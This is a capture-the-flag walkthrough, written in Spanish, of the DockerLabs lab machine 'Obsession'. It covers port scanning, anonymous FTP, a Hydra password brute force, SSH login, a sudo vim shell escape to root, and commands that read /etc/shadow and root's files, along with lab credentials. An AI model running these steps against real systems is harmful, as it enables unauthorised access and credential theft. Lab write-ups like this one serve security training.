# Obsession – Attack Path Analysis: FTP, SSH and Privilege Escalation

**Investigador:** Ackerman  
**Plataforma:** DockerLabs  
**Dificultad:** Fácil  
**IP objetivo:** 172.17.0.2

---

## Tabla de Contenidos

- [Descripción](#descripción)
- [Herramientas Usadas](#herramientas-usadas)
- [Reconocimiento](#reconocimiento)
- [Enumeración FTP](#enumeración-ftp)
- [Enumeración Web](#enumeración-web)
- [Fuerza Bruta de Credenciales](#fuerza-bruta-de-credenciales)
- [Análisis de Archivos](#análisis-de-archivos)
- [Acceso Inicial](#acceso-inicial)
- [Enumeración Local](#enumeración-local)
- [Escalada de Privilegios](#escalada-de-privilegios)
- [Post Explotación](#post-explotación)
- [Loot](#loot)
- [Cadena de Ataque](#cadena-de-ataque)

---

## Descripción

Máquina enfocada en **enumeración de servicios**, **acceso inicial mediante fuerza bruta** y **escalada de privilegios** a través de una mala configuración en sudo. La ruta de ataque combina divulgación de información vía FTP anónimo, descubrimiento de contenido web, fuerza bruta de credenciales y una escalada de privilegios clásica de estilo GTFOBins mediante `vim`.

---

## Herramientas Usadas

| Herramienta | Propósito |
|---|---|
| **Nmap** | Escaneo de puertos y servicios |
| **Gobuster** | Enumeración de directorios web |
| **Hydra** | Fuerza bruta de credenciales |
| **Cliente FTP** | Transferencia y enumeración de archivos |
| **OpenSSH** | Acceso remoto |
| **ExifTool** | Análisis de metadatos / esteganografía |
| **Vim** | Vector de escalada de privilegios |
| **SecLists** | Diccionarios / wordlists |

---

## Reconocimiento

Escaneo inicial de todos los puertos:

```bash
nmap -sV -sC -p- 172.17.0.2
```

<!-- ![Resultado de escaneo Nmap](screenshots/01-nmap-scan.png) -->

**Servicios abiertos:**

| Puerto | Servicio | Versión |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 9.6p1 |
| 80/tcp | HTTP | Apache 2.4.58 |

> Se detectó acceso FTP anónimo habilitado — primer punto de entrada.

---

## Enumeración FTP

Login anónimo:

```bash
ftp 172.17.0.2
```

<!-- ![Login FTP anónimo](screenshots/02-ftp-anon-login.png) -->

Listado de archivos:

```bash
ls
```

**Archivos encontrados:**
- `chat-gonza.txt`
- `pendientes.txt`

Descarga:

```bash
get chat-gonza.txt
get pendientes.txt
```

<!-- ![Archivos FTP descargados](screenshots/03-ftp-files.png) -->

**Hallazgos clave:**
- Usuario identificado: **`russoski`**
- Notas internas que hacen referencia a permisos inseguros

---

## Enumeración Web

Fuerza bruta de directorios:

```bash
gobuster dir -u http://172.17.0.2 -w /opt/SecLists/Discovery/Web-Content/common.txt
```

<!-- ![Resultado de Gobuster](screenshots/04-gobuster.png) -->

**Rutas interesantes encontradas:**
- `/backup`
- `/important`

---

## Fuerza Bruta de Credenciales

Ataque de fuerza bruta contra FTP usando el usuario identificado:

```bash
hydra -l russoski -P /opt/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt ftp://172.17.0.2
```

<!-- ![Hydra encuentra credenciales](screenshots/05-hydra.png) -->

**Credenciales encontradas:**

```text
russoski:iloveme
```

---

## Análisis de Archivos

La sesión FTP autenticada revela más directorios:

```bash
cd Documentos
ls
cd ../Proyectos
ls
```

<!-- ![Listado de archivos FTP autenticado](screenshots/06-ftp-authenticated.png) -->

**Archivos encontrados:**
- `Nikola Tesla.jpg`
- `README.md`
- `Strong-Credentials.py`

Descarga:

```bash
get "Nikola Tesla.jpg"
get README.md
get Strong-Credentials.py
```

Análisis:

```bash
strings "Nikola Tesla.jpg"
exiftool "Nikola Tesla.jpg"
cat README.md
cat Strong-Credentials.py
```

<!-- ![Análisis de metadatos con Exiftool](screenshots/07-exiftool.png) -->

---

## Acceso Inicial

Login SSH con las credenciales obtenidas:

```bash
ssh russoski@172.17.0.2
```

<!-- ![Login SSH exitoso](screenshots/08-ssh-login.png) -->

Autenticación exitosa como **`russoski`**.

---

## Enumeración Local

Verificaciones básicas post-acceso:

```bash
whoami
id
hostname
sudo -l
```

<!-- ![Verificación de permisos sudo](screenshots/09-sudo-l.png) -->

**Mala configuración de sudo encontrada:**

```text
(root) NOPASSWD: /usr/bin/vim
```

---

## Escalada de Privilegios

Escalada de privilegios generando una shell desde `vim`:

```bash
sudo vim -c ':!/bin/bash'
```

<!-- ![Escalada de privilegios vía vim](screenshots/10-privesc-vim.png) -->

Verificación:

```bash
whoami
id
```

**Acceso root confirmado:**

```text
root
uid=0(root) gid=0(root)
```

---

## Post Explotación

Búsqueda de archivos sensibles:

```bash
find / -name "*.txt" 2>/dev/null
ls -la /root
cat /root/*
cat /etc/shadow
```

<!-- ![Enumeración del sistema de archivos root](screenshots/11-post-exploitation.png) -->

**Hallazgos:**
- `Video-Nagore-Fernandez.txt`
- `.root-passwd.txt`
- `backup.txt`
- `/etc/shadow`

URL oculta descubierta:

```text
https://www.youtube.com/shorts/_v8GzGReTAk
```

---

## Loot

Todos los artefactos recolectados se encuentran en [`loot/`](loot/):

- `chat-gonza.txt`
- `pendientes.txt`
- `Nikola Tesla.jpg`
- `README.md`
- `Strong-Credentials.py`
- `Video-Nagore-Fernandez.txt`
- `/etc/shadow`

---

## Cadena de Ataque

```text
Recon → Enum FTP → Divulgación de Información → Gobuster → Hydra → SSH → Abuso de Sudo → Root
```
